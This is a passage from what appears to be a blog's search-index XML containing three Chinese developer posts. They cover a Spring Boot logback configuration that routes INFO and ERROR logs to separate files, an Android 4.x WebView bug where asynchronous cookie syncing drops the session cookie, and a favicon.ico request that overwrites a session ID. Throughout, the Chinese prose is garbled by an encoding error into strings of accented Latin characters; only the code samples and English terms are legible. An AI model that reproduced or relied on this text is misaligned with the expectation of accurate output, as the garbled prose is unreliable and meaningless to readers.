å…·ä½“çš„è¾“å‡ºå®žçŽ°æ˜¯ç”±å®žçŽ°slf4jçš„æ—¥å¿—æ¡†æž¶å®žçŽ°çš„ã€‚Spring Bootå¯¹logbackåšäº†é»˜è®¤é…ç½®ï¼Œå°†æ‰€æœ‰çš„çº§åˆ«æ—¥å¿—éƒ½ç»Ÿä¸€è¾“å‡ºåˆ°äº†åŒä¸€ä¸ªæ–‡ä»¶ã€‚åœ¨å®žé™…åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å°†ä¸åŒçº§åˆ«çš„æ—¥å¿—è¾“å‡ºåˆ°ä¸åŒæ–‡ä»¶ï¼Œæ¯”å¦‚info.log å’Œerror.logåœ¨ä¸šåŠ¡ä»£ç ä¸­é€šè¿‡ç›¸åº”çš„é€»è¾‘å¤„ç†ï¼Œè¾“å‡ºç›¸åº”çº§åˆ«çš„æ—¥å¿—ï¼Œè¿™æ ·ç›¸å…³äººå‘˜å¯ä»¥æ›´åŠ ç²¾ç¡®çš„æŸ¥æ‰¾åˆ†æžé—®é¢˜ã€‚ æ ¹æ®ä¸åŒçº§åˆ«ï¼Œå°†æ—¥å¿—åˆ†åˆ«è¾“å‡ºåˆ°ä¸åŒçš„æ–‡ä»¶ï¼š logbackæ—¥å¿—æ–‡ä»¶çš„å‘½åå’ŒåŠ è½½é¡ºåºæ¯æ¯ç›¸å…³ï¼Œlogback.xmlå…ˆäºŽapplication.ymlåŠ è½½ã€‚logback-spring.xmlæ™šäºŽapplication.ymlåŠ è½½ï¼Œå¦‚æžœlogbacké…ç½®éœ€è¦ä½¿ç”¨application.ymlä¸­çš„å±žæ€§ï¼Œåˆ™éœ€è¦å‘½åä¸ºlogback-spring.xml logbacké…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨application.ymlä¸­çš„å±žæ€§,éœ€è¦ä½¿ç”¨springPropertyæ ‡ç­¾æ¥å¼•ç”¨ åœ¨resourcesç›®å½•ä¸‹æ–°å»ºæ–‡ä»¶ logback-spring.xml1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;configuration&gt; &lt;!--æ—¥å¿—æ–‡ä»¶å­˜æ”¾è·¯å¾„ï¼Œè¯»å–application.ymlä¸­çš„é…ç½®ï¼Œè¯»å–ä¸åˆ°æ—¶ä½¿ç”¨defaultValueé»˜è®¤å€¼--&gt; &lt;springProperty scope="context" name="logPath" source="logging.path" defaultValue="logs"/&gt; &lt;!--æ—¥å¿—æ–‡ä»¶åç§°ï¼Œè¯»å–application.ymlä¸­çš„é…ç½®ï¼Œè¯»å–ä¸åˆ°æ—¶ä½¿ç”¨defaultValueé»˜è®¤å€¼--&gt; &lt;springProperty scope="context" name="logFile" source="logging.file" defaultValue="api-boot"/&gt; &lt;!--å®šä¹‰å±žæ€§å€¼ï¼Œæ—¥å¿—æ–‡ä»¶å­˜æ”¾è·¯å¾„--&gt; &lt;property name="LOG_HOME" value="$&#123;logPath&#125;"/&gt; &lt;!--å®šä¹‰å±žæ€§å€¼ï¼Œæ—¥å¿—æ–‡ä»¶åç§°--&gt; &lt;property name="LOG_FILE" value="$&#123;logFile&#125;"/&gt; &lt;!--æŽ§åˆ¶å°è¾“å‡º--&gt; &lt;appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;encoder&gt; &lt;pattern&gt;%boldCyan(%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125;) - %boldRed(%5p) %blue([%10.10t]) %magenta(%-35.35logger&#123;20&#125;) %yellow(%2M) %green(%2L) : %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--INFOçº§åˆ«æ—¥å¿—--&gt; &lt;appender name="INFO" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;onMatch&gt;DENY&lt;/onMatch&gt; &lt;onMismatch&gt;ACCEPT&lt;/onMismatch&gt; &lt;/filter&gt; &lt;encoder&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %X&#123;LOG_ID&#125; [%thread] %-5level %logger&#123;100&#125;.%method\(\):%L - %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;!--æ»šåŠ¨ç­–ç•¥--&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--æ–‡ä»¶è¾“å‡ºè·¯å¾„å’Œåç§°--&gt; &lt;fileNamePattern&gt;$&#123;LOG_HOME&#125;/$&#123;LOG_FILE&#125;.info.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;/appender&gt; &lt;!--ERRORçº§åˆ«æ—¥å¿—--&gt; &lt;appender name="ERROR" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;/filter&gt; &lt;encoder&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %X&#123;LOG_ID&#125; [%thread] %-5level %logger&#123;100&#125;.%method\(\):%L - %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;!--æ»šåŠ¨ç­–ç•¥--&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--æ–‡ä»¶è¾“å‡ºè·¯å¾„å’Œåç§°--&gt; &lt;fileNamePattern&gt;$&#123;LOG_HOME&#125;/$&#123;LOG_FILE&#125;.error.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;/appender&gt; &lt;root level="info"&gt; &lt;appender-ref ref="STDOUT" /&gt; &lt;appender-ref ref="INFO" /&gt; &lt;appender-ref ref="ERROR" /&gt; &lt;/root&gt;&lt;/configuration&gt; è¿™æ ·å°±å°†infoå’Œerrorçº§åˆ«çš„æ—¥å¿—è¾“å‡ºåˆ°äº†æŒ‡å®šç›®å½•ä¸‹çš„ä¸åŒæ–‡ä»¶ã€‚]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Androidä½Žç‰ˆæœ¬WebViewå¼•èµ·çš„BUG]]></title>
    <url>%2F48b8924c%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘ä¸Šçº¿çš„ä¸€ä¸ªé¡¹ç›®ï¼ŒAndroidå®¢æˆ·ç«¯é‡‡ç”¨åŽŸç”Ÿå’ŒéžåŽŸç”Ÿæ··åˆå¼€å‘ï¼ŒåŽç«¯APIé‡‡ç”¨Sessionæœºåˆ¶è®¤è¯ï¼Œå‡ºçŽ°éƒ¨åˆ†Androidæœºåž‹æ— æ³•ä½¿ç”¨WebViewä¸­åŠ è½½çš„æ ¸å¿ƒä¸šåŠ¡ï¼Œé€šè¿‡æŠ“åŒ…å‘çŽ°ï¼ŒæŸäº›å®¢æˆ·ç«¯åœ¨ä½¿ç”¨WebViewå‘èµ·è¯·æ±‚æ—¶æ²¡æœ‰å¸¦ä¸Šç™»å½•æ—¶å¾—åˆ°çš„SESSIONID,Androidå¼€å‘äººå‘˜é€šè¿‡æ—¥å¿—è¾“å‡ºè¯å®žæœ‰æŠŠç™»å½•çš„SESSIONIDåŒæ­¥è®¾ç½®ç»™WebViewçš„Cookieï¼Œå¹¶ä¸”é€šè¿‡cookieManager.getCookieæ–¹æ³•èƒ½å¤Ÿå–åˆ°åŒæ­¥è®¾ç½®çš„Cookieã€‚äºŽæ˜¯æˆ‘åªèƒ½è‡ªå·±å†è¿›ä¸€æ­¥éªŒè¯ä¸€ä¸‹ï¼Œæœ€ç»ˆæ‰¾åˆ°é—®é¢˜æ‰€åœ¨ã€‚ æµ‹è¯•çš„ä¸»è¦é—®é¢˜å¦‚ä¸‹ï¼š1.éƒ¨åˆ†Androidæœºåž‹(éƒ¨åˆ†åŽ‚å•†çš„7.xå’Œ8xçš„Androidç‰ˆæœ¬å·)æ— æ³•è¯·æ±‚åˆ°Webé¡µé¢ï¼Œä¼šè¢«åŽç«¯æ‹¦æˆª2.æˆ‘ç”¨Android 5.x åˆ° 9.x çš„æ¨¡æ‹Ÿå™¨æµ‹è¯•å®Œå…¨æ­£å¸¸ï¼ŒæŠ“åŒ…æ—¶è¯·æ±‚å¤´çš„Cookieä¸­ä¹Ÿæ­£å¸¸æºå¸¦SESSIONIDï¼Œä½†æ˜¯ç”¨æˆ·çœŸå®žæœºåž‹å‡ºçŽ°ä¸æºå¸¦Cookieçš„æƒ…å†µ3.Androidå¼€å‘äººå‘˜ç¡®å®žæŠŠSESSIONIDåŒæ­¥è®¾ç½®ç»™WebViewçš„Cookieäº†ï¼Œå®¢æˆ·ç«¯è®¾ç½®çš„Cookieä¹Ÿå¯ä»¥é€šè¿‡getCookieæ–¹æ³•å–å‡ºæ¥ï¼Œä½†æ˜¯æŠ“åŒ…å‘çŽ°åœ¨æŸäº›æœºåž‹ä¸ŠWebViewåŠ è½½URLçš„æ—¶å€™å¹¶æ²¡æœ‰å¸¦ä¸ŠCookieã€‚ å›žæƒ³äº†ä¸€ä¸‹ä¹‹å‰Androidå¼€å‘ä¸­æ›¾ç»é‡åˆ°çš„å‘ï¼ŒäºŽæ˜¯ç”¨Android4.3ç‰ˆæœ¬çš„æ¨¡æ‹Ÿæµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘çŽ°è¯·æ±‚å¤´ä¸­å›½ç„¶ä¹Ÿæ²¡å¸¦ä¸ŠCookieandroid4.3WebViewåŠ è½½æŽ¥å£åœ°å€æ—¶ï¼Œè¯·æ±‚å¤´æ•°æ®åŒ…å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¯ä»¥çœ‹åˆ°4.3ç‰ˆæœ¬çš„AndroidWebKitåœ¨è¯·æ±‚å¤´ä¸­å­˜åœ¨ä¸æºå¸¦Cookieçš„æƒ…å†µç”¨android5.0ç‰ˆæœ¬çš„æ¨¡æ‹Ÿå™¨æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘çŽ°è¯·æ±‚å¤´ä¸­æœ‰æºå¸¦Cookieæ‰€ä»¥ï¼Œè¿™äº›æœºåž‹çš„äº§å•†å¯èƒ½è¦æ‘¸ä¸€ä¸‹è‡ªå·±çš„è‰¯å¿ƒäº†ï¼Œä¸ºäº†å‡å°‘ROMçš„å¼€å‘æˆæœ¬ï¼Œæ˜¯ä¸æ˜¯æŠŠéƒ¨åˆ†ä½Žç‰ˆæœ¬çš„WebKitå†…æ ¸ç›´æŽ¥ç…§æ¬ç¼–è¯‘åˆ°æ–°ç³»ç»Ÿé‡Œäº†ï¼Ÿåœ¨ç½‘ä¸Šç»å¸¸å¯ä»¥çœ‹åˆ°ä¸€å †ç›¸äº’æŠ„è¢­çš„æ–‡ç« ï¼ŒWebViewåŒæ­¥Cookieçš„æ–¹æ³•å¦‚ä¸‹ï¼š12345678910111213141516/** * åŒæ­¥cookie */public static void synCookies(Context context, String url) &#123; CookieSyncManager.createInstance(context); CookieManager cookieManager = CookieManager.getInstance(); cookieManager.setAcceptCookie(true); // åˆ é™¤Cookieï¼ˆå¯é€‰ï¼‰ cookieManager.removeSessionCookie(); cookieManager.setCookie(url, "ç™»å½•æ—¶å¾—åˆ°çš„SESSIONID"); CookieSyncManager.getInstance().sync(); // å¯ä»¥æ—¥å¿—è¾“å‡ºå†éªŒè¯ä¸€ä¸‹ String cookie = cookieManager.getCookie(url); ...&#125;è¿™æ®µä»£ç ä¹ä¸€çœ‹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œè™½ç„¶getCookieå¯ä»¥å–åˆ°è®¾ç½®è¿›åŽ»çš„Cookieï¼Œä½†æ˜¯è¯·æ±‚æ—¶å­˜åœ¨æ²¡å¸¦ä¸ŠCookieçš„æƒ…å†µã€‚é—®é¢˜å°±å‡ºåœ¨åŒæ­¥æ–¹æ³•ä¸Šã€‚å¦‚æžœåˆšå¥½çœ‹è¿‡4.xçš„æºç ï¼Œä¼šå‘çŽ°å’ŒçŽ°åœ¨çš„ç‰ˆæœ¬æœ‰æ¯”è¾ƒå¤§çš„ä¸ä¸€æ ·ã€‚è¿™é‡Œæœ€å¤§çš„åŒºåˆ«æ˜¯:4.3ç‰ˆæœ¬çš„removeSessionCookieæ–¹æ³•åˆ é™¤Cookieæ˜¯å¼‚æ­¥çš„syncåŒæ­¥è®¾ç½®Cookieä¹Ÿæ˜¯å¼‚æ­¥çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ä»–å¯èƒ½åœ¨ä½ è®¾ç½®äº†Cookieä¹‹åŽæ‰æ‰§è¡Œremoveæ“ä½œï¼Œæˆ–è€…åœ¨WebViewè¯·æ±‚åŽæ‰è®¾ç½®Cookieï¼ŒWebViewå‘èµ·è¯·æ±‚æ—¶è¦ä¹ˆCookieè¿˜æ²¡è¢«è®¾ç½®ï¼Œè¦ä¹ˆå°±æ˜¯å·²ç»è¢«åˆ é™¤ã€‚æ‰€ä»¥åœ¨WebViewåŠ è½½URLå‘èµ·è¯·æ±‚æ—¶æ ¹æœ¬æ²¡æœ‰æŠŠCookieå¸¦ä¸Šã€‚ ä¸€ã€Android5.0åŠä»¥ä¸Šçš„WebViewæ“ä½œCookieåŽçš„æ—¶åºå›¾ äºŒã€Android4.3ç‰ˆæœ¬ï¼‰æ“ä½œCookieåŽçš„æ—¶åºå›¾ è§£å†³æ–¹æ¡ˆ WebViewä½¿ç”¨Postè¯·æ±‚å°±å¯ä»¥åœ¨å¤´éƒ¨å¸¦ä¸Šè‡ªå®šä¹‰å‚æ•°ï¼Œéœ€è¦åŽç«¯æŽ¥å£ä¹Ÿè·Ÿç€ä¸€èµ·æ”¹ Androidå®¢æˆ·ç«¯åˆ é™¤Cookieæ“ä½œåŽé¢åŠ ä¸Šç­‰å¾…æ—¶é—´æ¯”å¦‚ Sleep 1000Lã€‚ ä¸Šé¢è¿™ä¸¤ç§æ–¹æ¡ˆåªæ˜¯è§£å†³é—®é¢˜ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯è§„èŒƒçš„ï¼Œå…¶å®žCookieSyncManagerç±»å’ŒcookieManagerçš„å¾ˆå¤šæ–¹æ³•å·²ç»è¢«æ ‡æ³¨ä¸ºå¼ƒç”¨https://developer.android.com/reference/android/webkit/CookieSyncManager é€šè¿‡androidå®˜æ–¹æ–‡æ¡£å¯çŸ¥ï¼Œè¿™äº›éƒ½è¢«æ ‡æ³¨äº†@Deprecatedï¼Œæ‰€ä»¥å¼€å‘è€…åœ¨å¼€å‘çš„æ—¶å€™è¦è€ƒè™‘å…¼å®¹æ€§é—®é¢˜ï¼Œé’ˆå¯¹å¤§ä¼—çš„äº§å“è¦è¶³å¤Ÿçš„ç»†å¿ƒ å‡ºçŽ°è¿™äº›BUGçš„ä¸»è¦åŽŸå› åœ¨æˆ‘å†™è¿™ç¯‡æ–‡ç« æ—¶ï¼ŒGoogleå®˜æ–¹è™½ç„¶ä»¥åŠå°†Androidæ›´æ–°åˆ°äº†9.0çš„ç‰ˆæœ¬ï¼Œä½†æ˜¯ç›®å‰åœ¨ä¸­å›½å¸‚åœºè¿˜å­˜åœ¨å¾ˆå¤šç‰ˆæœ¬ç¢Žç‰‡åŒ–çš„é—®é¢˜ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šè¿‡æ—¶çš„APIç¤ºä¾‹ï¼Œå›½å†…çš„å¾ˆå¤šæ–‡ç« éƒ½ç›¸äº’æŠ„è¢­ï¼Œæœ‰çš„æ ¹æœ¬æ²¡æœ‰è‡ªå·±è¯•éªŒè¿‡å°±æ‹·è´è¿‡æ¥å‘è¡¨ï¼Œè¿™æ ·çš„ä¼ æ’­æ˜¯éžå¸¸ä¸è´Ÿè´£ä»»çš„ã€‚ å¦å¤–è¿˜æœ‰ä¸€ä¸ªä¸»è¦å› ç´ æ˜¯å¾ˆå¤šåŽ‚å•†å–œæ¬¢è‡ªå·±å®šåˆ¶ï¼Œæ›¾ç»æˆ‘è¿˜åœ¨å¼€å‘Androidåº”ç”¨æ—¶ï¼Œå°±é‡åˆ°æŸä¸ªåŽ‚å•†æŠŠæ‘„åƒå¤´æ‹ç…§å›žè°ƒçš„APIä¿®æ”¹äº†ï¼Œå¯¼è‡´æ¨ªç«–å±åˆ‡æ¢çš„çš„é—®é¢˜ï¼Œè¿™ç§å®šåˆ¶å¯ä»¥è¯´æ˜¯éžå¸¸æ¶å¿ƒæ¥å½¢å®¹äº†ï¼Œå¯èƒ½è¿™ä¹Ÿæ˜¯æˆ‘å¼ƒå‘çš„åŽŸå› ä¹‹ä¸€å§ã€‚å¦å¤–æˆ‘çœŸçš„éžå¸¸å–œæ¬¢å†™åŽå°ï¼Œæ‰€ä»¥çŽ°åœ¨èƒ½å¤Ÿå†™APIæŽ¥å£æ„Ÿåˆ°å¾ˆæ¬£æ…°ã€‚ æ›¾å‡ ä½•æ—¶ï¼Œä¾ç¨€è®°å¾—åœ¨å­¦æ ¡å·¥ä½œå®¤çš„æ—¶å…‰ï¼Œæ›¾ç»çš„æ–¹è€å¸ˆè·Ÿæˆ‘ä»¬è¯´è¿‡è¿™æ ·ä¸€å¥è¯â€œé‡åˆ°é—®é¢˜ä¸è¦è¯´æˆ‘æ˜¯å­¦Androidçš„ï¼ŒåŽç«¯çš„æˆ‘ä¸ç®¡â€¦,ä¸è¦è¯´ä»€ä¹ˆä»ŽAndroidå¼€å‘è½¬åŽç«¯å¼€å‘è¿™æ ·çš„è¯ï¼Œä½ æ›¾ç»å­¦åˆ°çš„çŸ¥è¯†å°±æ˜¯ä½ è‡ªå·±çš„ï¼Œæ²¡æœ‰è½¬è¡Œï¼Œéƒ½æ˜¯å¼€å‘ï¼Œèƒ½åœ¨ä¸€ä¸ªé¢†åŸŸæœ‰æ‰€æˆå°±å–å†³äºŽä½ æœ‰å¤šä¸“æ³¨â€ã€‚åŽŸè¯è™½ç„¶è®°å¾—ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œä½†æ˜¯å¤§ä½“å°±æ˜¯è¿™ä¸ªæ„æ€ï¼Œè¿™å¥è¯åˆ°çŽ°åœ¨ä¸€ç›´é“­è®°åœ¨æˆ‘è„‘æµ·é‡Œã€‚æ‰€ä»¥é‡åˆ°é—®é¢˜æˆ‘ä¸æ€•ï¼Œæˆ‘çš„æƒ³æ³•åªæœ‰ä¸€ä¸ªï¼šæ‰¾å‡ºé—®é¢˜ï¼Œå¹¶è§£å†³å®ƒã€‚]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>é—®é¢˜è§£å†³</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸€ä¸ªfavicon.icoå›¾æ ‡å¼•å‘çš„é‡å¤§äº‹æ•…]]></title>
    <url>%2F285afbcd%2F</url>
    <content type="text"><![CDATA[ä¹Ÿè®¸å¾ˆéš¾è®©äººç›¸ä¿¡ï¼Œä¸€ä¸ªfavicon.icoå›¾æ ‡ä¼šå¼•èµ·é‡å¤§äº‹æ•…ï¼Œè€Œæˆ‘çœŸçš„å°±äº²èº«ç»åŽ†äº†ä¸€å›žã€‚æœ€è¿‘ä¸Šçº¿çš„ä¸€ä¸ªé¡¹ç›®å‡ºçŽ°äº†åŒªå¤·æ‰€æ€çš„äº‹æƒ…ã€‚å¦‚æžœä¸åŽ»æŠ“åŒ…åˆ†æžï¼Œå°±çœŸçš„å°±å¯ä»¥ç§°å¾—ä¸ŠçŽ„å­¦äº†ã€‚è¿™ä¸ªé¡¹ç›®åˆ†ä¸ºAPIåŽç«¯å’ŒAndroidå®¢æˆ·ç«¯ä»¥åŠåµŒå…¥WebViewçš„ç½‘é¡µã€‚å®¢æˆ·ç«¯é™¤äº†ç™»å½•å’Œä¸€äº›åŸºæœ¬çš„APIæ˜¯åŽŸç”Ÿæ“ä½œä»¥å¤–ï¼Œå…¶ä»–æ ¸å¿ƒä¸šåŠ¡éƒ½æ˜¯åœ¨WebViewåŠ è½½çš„ç½‘é¡µä¸Šè¿›è¡Œäº¤äº’çš„ã€‚é¡¹ç›®å‘å¸ƒç”Ÿäº§çŽ¯å¢ƒä¸Šçº¿åŽï¼Œéƒ¨åˆ†æœºåž‹çš„ç”¨æˆ·ååº”æ ¸å¿ƒåŠŸèƒ½æ— æ³•ä½¿ç”¨ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šé€ æˆäº†å¾ˆä¸¥é‡çš„é—®é¢˜ã€‚æœ€ç»ˆå®šä½åˆ°é—®é¢˜åœ¨icoå›¾æ ‡ï¼Œä¸‹é¢è¿›è¡Œè¯¦ç»†çš„åˆ†æžã€‚ åœ¨Appå®¢æˆ·ç«¯ä¸­åµŒå…¥WebViewï¼Œè¿›è¡ŒåŽŸç”Ÿå’ŒéžåŽŸç”Ÿçš„æ··åˆå¼€å‘åœ¨çŽ°ä»Šä¾ç„¶æ˜¯æˆæœ¬è¿­ä»£çš„äº§ç‰©ã€‚åœ¨å¾ˆå¤šåœºåˆä¸‹APIä¹‹é—´çš„è¯·æ±‚è¶Šæ¥è¶Šå¤šçš„é‡‡ç”¨Tokenæœºåˆ¶ä»£æ›¿Sessionï¼Œä½†æ˜¯Sessionä¹Ÿæœ‰è‡ªå·±çš„ä¸€å¥—è‡ªå·±çš„å®Œå–„æ–¹æ¡ˆæ¥ä¿è¯APIå®‰å…¨ï¼Œè¿™é‡Œä¸åšTokenå’ŒSessionçš„å¯¹æ¯”ã€‚ ç”±äºŽé¡¹ç›®çš„ç‰¹æ®Šæ€§ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„APIæŽ¥å£é‡‡ç”¨Sessionæœºåˆ¶ æµ‹è¯•çš„ä¸»è¦é—®é¢˜å¦‚ä¸‹ï¼š1.APPå®¢æˆ·ç«¯å¯¹æµ‹è¯•çŽ¯å¢ƒçš„æ‰€æœ‰è¯·æ±‚å®Œå…¨æ­£å¸¸ï¼Œä½†æ˜¯åœ¨ç”Ÿäº§çŽ¯å¢ƒä¸‹ï¼ŒåŽç»­é¡µé¢ä¸­çš„Ajaxè¯·æ±‚çš„æ ¸å¿ƒä¸šåŠ¡å¼‚å¸¸2.PCæµè§ˆå™¨æ‰“å¼€å¯¹åº”çš„ç½‘é¡µï¼Œæ— è®ºæµ‹è¯•çŽ¯å¢ƒè¿˜æ˜¯ç”Ÿäº§çŽ¯å¢ƒï¼Œå…¨éƒ¨éƒ½æ˜¯æ­£å¸¸çš„ é’ˆå¯¹è¿™ä¸ªé—®é¢˜ï¼Œæ˜¯æ— æ³•ä»Žç¼–ç çš„è§’åº¦å‘çŽ°çš„ï¼Œæ‰€ä»¥å¿…é¡»æŠ“åŒ…åˆ†æžä¸€ä¸‹åŒºåˆ«æ ¹æ®æŠ“åŒ…çš„æ•°æ®åˆ†æžå¹¶ä¸”æ‰¾åˆ°äº†é—®é¢˜æ‰€åœ¨ï¼Œæˆ‘æŠŠæŠ“åˆ°çš„åŒ… é€šè¿‡ä¸‹é¢çš„æµ‹è¯•çŽ¯å¢ƒå’Œç”Ÿäº§çŽ¯å¢ƒçš„è¯·æ±‚æ—¶åºå›¾ç®€è¦çš„ç½—åˆ—äº†å‡ºæ¥ã€‚ ä¸€ã€æµ‹è¯•çŽ¯å¢ƒçš„è¯·æ±‚åœ¨æ··åˆå¼€å‘ä¸­ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ­£å¸¸çš„è¯·æ±‚å“åº”å¦‚ä¸‹å›¾æ‰€ç¤º:Androidå®¢æˆ·ç«¯æœ‰åŽŸç”Ÿçš„APIè¯·æ±‚å’ŒWebViewè¯·æ±‚ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå…¶ä¸­ç™»å½•è¯·æ±‚æ˜¯ç”¨AndroidåŽŸç”Ÿçš„è¯·æ±‚å®žçŽ°çš„ï¼Œå¹¶ä¸”æŠŠç™»å½•åŽå¾—åˆ°çš„SessionIDé€šè¿‡CookieåŒæ­¥è®¾ç½®ç»™WebViewã€‚è¿™æ ·WebViewåœ¨åŽç»­è¯·æ±‚æ—¶ä¼šè‡ªåŠ¨å¸¦ä¸Šå…¶ä¸­ç»¿è‰²çš„ç”Ÿå‘½çº¿éƒ¨åˆ†ä»£è¡¨å®¢æˆ·ç«¯çš„WebViewï¼ˆä¸ºäº†å·æ‡’è¿™é‡Œç®€åŒ–äº†æ—¶åºå›¾ï¼‰ äºŒã€ç”Ÿäº§çŽ¯å¢ƒçš„è¯·æ±‚ é€šè¿‡æ—¶åºå›¾å¯çŸ¥ï¼Œç”Ÿäº§çŽ¯å¢ƒä¸‹éƒ¨ç½²äº†å¾ˆå¤šé¡¹ç›®ï¼Œå…¶ä¸­æœ‰ä¸ªWEBæœåŠ¡çš„åŸŸåä¸ºwww.pro-web.com,è€Œæˆ‘ä»¬çš„åŽç«¯APIæœåŠ¡éƒ¨ç½²åœ¨è¿™ä¸ªåŸŸåçš„å­ç›®å½•ä¸‹é¢ï¼šwww.pro-web.com/api/ ä½Žç‰ˆæœ¬Androidçš„WebViewåœ¨å‘èµ·è¯·æ±‚æ—¶ï¼Œé»˜è®¤ä¼šè¯·æ±‚å¯¹åº”åŸŸåçš„favicon.icoèµ„æºã€‚è¿™ä¸ªåŸŸåæ”¹å¥½è¢«WEBæœåŠ¡Aæ‹¦æˆªï¼Œé‡æ–°åˆ†é…äº†ä¸€ä¸ªSESSIONIDç»™WebViewï¼Œé€šè¿‡å“åº”å¤´çš„Set-Cookieå°†æ—§çš„Cookieä¸­çš„SESSIONIDè¦†ç›–ã€‚ç”±äºŽè¿™ä¸ªSESSIONIDæ˜¯WEBæœåŠ¡Aåˆ†é…çš„ï¼Œå¯¼è‡´åŽç»­çš„Ajaxè¯·æ±‚APIæœåŠ¡ç«¯æ—¶ï¼ŒAPIæœåŠ¡æ— æ³•æ ¹æ®SESSIONIDæ‰¾å‡ºå¯¹åº”çš„SESSIONï¼Œè®¤ä¸ºè¯¥ç”¨æˆ·æ²¡æœ‰ç™»å½•ï¼Œæ‰€ä»¥æ— æ³•è¿›è¡Œæ­£å¸¸çš„ä¸šåŠ¡è¯·æ±‚ã€‚ äºŒã€å¾—å‡ºçš„ç»“è®ºç”±äºŽAndroidä¸åŒç‰ˆæœ¬å·çš„WebViewçš„è¯·æ±‚æ–¹å¼æœ‰åŒºåˆ«ï¼Œæ‰€ä»¥åœ¨è¯·æ±‚æŽ¥å£åœ°å€www.pro-web.com/api/çš„èµ„æºæ—¶ï¼Œä¼šè‡ªåŠ¨è¯·æ±‚www.pro-web.comåŸŸåä¸‹çš„favicon.icoå›¾æ ‡ã€‚ è€Œä¸”åˆšå¥½www.pro-web.comè¿™ä¸ªåŸŸåä¸‹æœ‰å…¶ä»–çš„WebæœåŠ¡æ‹¦æˆªäº†icoè¯·æ±‚,å¹¶ä¸”é‡å®šå‘åˆ°äº†è¿™ä¸ªWebæœåŠ¡çš„å…¶ä»–ä¸šåŠ¡ï¼Œå¯¼è‡´é‡æ–°åˆ†é…äº†ä¸€ä¸ªæ”¹WebæœåŠ¡å¯¹åº”çš„SESSIONIDï¼Œé€šè¿‡è¿”å›žä½“å¤´ä¸­çš„Set-Cookieè‡ªåŠ¨å°†å®¢æˆ·ç«¯åŽŸæœ¬çš„SESSIONIDè¦†ç›–ã€‚é€ æˆäº†åŽç»­æœåŠ¡çš„ä¸å¯ç”¨ã€‚ è§£å†³æ–¹æ¡ˆ1.androidçš„WebViewè®¾ç½®ä¸è¯·æ±‚ç½‘ç«™çš„favicon.icoèµ„æº2.åœ¨xxx.htmlä¸­æ·»åŠ icoèµ„æºï¼Œä¼˜å…ˆçº§æœ€é«˜ï¼Œè¿™æ ·å°±ä¸ä¼šå†åŽ»è¯·æ±‚icoèµ„æº3.ç›¸åŒåŸŸåä¸‹å¦‚æžœæœ‰å¤šä¸ªé¡¹ç›®ï¼Œéœ€è¦ä¸ºæ¯ä¸ªé¡¹ç›®é…ç½®å„è‡ªçš„ä¸Šä¸‹æ–‡ï¼Œä¸èƒ½å‡ºçŽ°ä¸Šä¸‹æ–‡åµŒå¥—çš„æƒ…å†µ4.ä½¿ç”¨Tokenæœºåˆ¶è¿›è¡ŒAPIæŽ¥å£éªŒè¯ï¼Œè¿™æ ·å°±é¿å…äº†æœåŠ¡ç«¯æ‹¦æˆªèµ„æºåŽSet-CookieæŠŠå®¢æˆ·ç«¯ç™»å½•æ—¶æ­£å¸¸çš„SESSIONIDè¦†ç›– æ–¹æ¡ˆ1ï¼šè€ƒè™‘åˆ°androidå¼€å‘æ¯”è¾ƒå¿™ï¼Œæ²Ÿé€šçš„æˆæœ¬æ¯”è¾ƒå¤§æ–¹æ¡ˆ3ï¼šæ—§é¡¹ç›®çš„ç”Ÿäº§çŽ¯å¢ƒåœ°å€å·²ç»ç”¨äº†å¾ˆä¹…ï¼Œä¿®æ”¹ä¸Šä¸‹æ–‡å¯èƒ½ä¼šé€ æˆå…¶ä»–çš„æœåŠ¡è°ƒç”¨é—®é¢˜ã€‚æ–¹æ¡ˆ4ï¼šä»ŽSessionåˆ°Tokenè¿ç§»éœ€è¦å¾ˆå¤§çš„å·¥ä½œé‡ï¼Œå°¤å…¶æ˜¯å·²ç»ä¸Šçº¿çš„æœåŠ¡æ¯”è¾ƒå¤šçš„æ—¶å€™ï¼Œä¼šç‰µä¸€å‘è€ŒåŠ¨å…¨èº«ã€‚ 